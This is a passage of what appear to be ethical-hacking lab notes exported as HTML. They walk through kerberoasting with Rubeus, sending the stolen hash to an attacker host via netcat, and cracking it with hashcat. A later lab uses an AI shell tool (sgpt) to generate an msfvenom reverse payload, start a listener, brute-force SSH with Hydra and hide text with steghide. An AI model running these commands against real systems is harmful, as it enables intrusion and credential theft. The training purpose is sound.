+</p><ol type="1" id="24d3addf-00cb-80eb-a064-cab3833f0fca" class="numbered-list" start="1"><li>In the netcat shell - execute <em><strong>powershell</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8071-bb1d-d6850bf31b6c" class="numbered-list" start="2"><li>Navigate to <strong>Users\Public\Downloads</strong></li></ol><ol type="1" id="24d3addf-00cb-8022-9096-f974a949b27e" class="numbered-list" start="3"><li>Download Rubeus and netcat</li></ol><ol type="1" id="24d3addf-00cb-80e8-8124-d6c280ccad1f" class="numbered-list" start="4"><li><em><strong>wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe. </strong></em></li></ol><ol type="1" id="24d3addf-00cb-8007-828e-d579aac81f0e" class="numbered-list" start="5"><li>Once tools are downloaded &gt; <em><strong>exit &gt; enter</strong></em></li></ol><ol type="1" id="24d3addf-00cb-80fe-921a-c9924d84e024" class="numbered-list" start="6"><li>Navigate to <strong>Users\Public\Downloads</strong></li></ol><ol type="1" id="24d3addf-00cb-80ae-9cd0-dced51d3d8d8" class="numbered-list" start="7"><li><em><strong>rubeus.exe kerberoast /outfile:hash.txt </strong></em></li></ol><ol type="1" id="24d3addf-00cb-8042-a2fa-eaf183749f8b" class="numbered-list" start="8"><li>After kerberoasting the password hash for DC-Admin is saved in the hash.txt file. </li></ol><ol type="1" id="24d3addf-00cb-803e-9b8d-ca266865ce75" class="numbered-list" start="9"><li>Use netcat toi get the hash file on the attacker machine<ol type="a" id="24d3addf-00cb-8054-b694-f02da41d86d7" class="numbered-list" start="1"><li><em><strong>nc -lvp 9999 &gt; hash.txt</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8096-b48b-c0e0eff9a372" class="numbered-list" start="2"><li>In the shell terminal, execute the command <em><strong>ncat.exe -w 3 10.10.1.13 9999 &lt; hash.txt</strong></em></li></ol><figure id="24d3addf-00cb-80a3-b21d-dc0a601fc6bd" class="image"><a href="image%2052.png"><img style="width:672px" src="image%2052.png"/></a></figure></li></ol><ol type="1" id="24d3addf-00cb-8089-ab1b-e75e36f232b7" class="numbered-list" start="10"><li>Get back to the netcat listener terminal and press Enter to save the file. <figure id="24d3addf-00cb-8023-915b-daf1022818a5" class="image"><a href="image%2053.png"><img style="width:720px" src="image%2053.png"/></a></figure></li></ol><ol type="1" id="24d3addf-00cb-803f-8f1c-ff6ebd6bd5a4" class="numbered-list" start="11"><li>Execute the command<em><strong> hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt </strong></em>to crack the password hash<ol type="a" id="24d3addf-00cb-80c6-a3e3-cf05236a752b" class="numbered-list" start="1"><li><em><strong>-m 13100:</strong></em> This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.</li></ol><ol type="a" id="24d3addf-00cb-80bb-9cfe-eff3c2f3840d" class="numbered-list" start="2"><li><em><strong>--force:</strong></em> This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results.</li></ol><ol type="a" id="24d3addf-00cb-802a-842c-e614e36a794e" class="numbered-list" start="3"><li><em><strong>-a 0</strong></em>: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.</li></ol><ol type="a" id="24d3addf-00cb-802c-aa19-f0eeddd1199d" class="numbered-list" start="4"><li><em><strong>hash.txt:</strong></em> is the input file containing the hashes to crack </li></ol><ol type="a" id="24d3addf-00cb-8036-8762-fe33d750aa5b" class="numbered-list" start="5"><li><em><strong>/root/ADtools/rockyou.txt:</strong></em> is the wordlist file used for the attack</li></ol></li></ol><figure id="24d3addf-00cb-8038-9208-f6e3628cda41" class="image"><a href="image%2054.png"><img style="width:576px" src="image%2054.png"/></a></figure><p id="24d3addf-00cb-80a7-814a-e82e25046b3b" class="">
+</p><p id="24d3addf-00cb-80af-b376-e8d4113fbede" class="">
+</p><h3 id="24d3addf-00cb-80c6-9b2c-ea134842703d" class="">Lab 6: Perform System Hacking using AI </h3><p id="24d3addf-00cb-8007-8895-df572f59d6d9" class="">
+</p><p id="24d3addf-00cb-8035-924c-ccdcf1ac38a4" class="">Generate a payload using <strong>msfvenom: </strong></p><p id="24d3addf-00cb-8085-bf5b-e8171c013343" class=""><em><strong>sgpt --shell “Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444&quot; </strong></em></p><ul id="24d3addf-00cb-80fc-9385-fc823a369c97" class="bulleted-list"><li style="list-style-type:disc"><em><strong>ls</strong></em> will show the file named payload.exe has been created in the cwd</li></ul><p id="24d3addf-00cb-80cc-aab7-cbac4dc6fb61" class="">
+</p><p id="24d3addf-00cb-80e0-9ab7-eebc5ea30c76" class="">Initialize listener on the given LHOST and LPORT: </p><p id="24d3addf-00cb-804b-9a7e-e5924d4bb601" class=""><em><strong>sgpt --shell “Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444&quot; </strong></em></p><p id="24d3addf-00cb-80ca-ae08-e492cad8d385" class=""><strong>Note</strong>: As we are not executing payload in the victim&#x27;s machine, you will not be able to establish any session.<br/></p><p id="24d3addf-00cb-809e-b73e-c2060e0e85c7" class="">Perform SSH-bruteforce attack on the target machine: </p><p id="24d3addf-00cb-8071-b77d-cbb445dd6a19" class=""><em><strong>sgpt --shell “Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt files available at location /home/attacker/Wordlist&quot; </strong></em></p><figure id="24d3addf-00cb-8009-9b73-f388bbe3301f" class="image"><a href="image%2055.png"><img style="width:816px" src="image%2055.png"/></a></figure><p id="24d3addf-00cb-803c-87dc-d473987f9736" class="">
+</p><p id="24d3addf-00cb-8088-b883-e293e0830b31" class="">Image steganography</p><p id="24d3addf-00cb-8039-83cc-c484845f1349" class=""><em><strong>sgpt --shell “Perform stegnography using steghide to hide text &#x27;My swiss account number is 232343435211113&#x27; in cover.jpg image file with password as &#x27;1234&#x27;&quot; </strong></em></p><p id="24d3addf-00cb-8082-95cd-deae294faf1d" class="">
+</p><p id="24d3addf-00cb-80ff-a0ab-f32c9dccb8e8" class="">Extract text in image using steghide: </p><p id="24d3addf-00cb-80b3-a312-ddf6939356f8" class=""><em><strong>sgpt --shell “Use steghide to extract hidden text in cover.jpg&quot;. </strong></em></p><p id="24d3addf-00cb-80c4-bd5c-f0995f4687bb" class="">
+</p></div></details><p id="27e3addf-00cb-8091-bb92-c2e1ffa56e3a" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
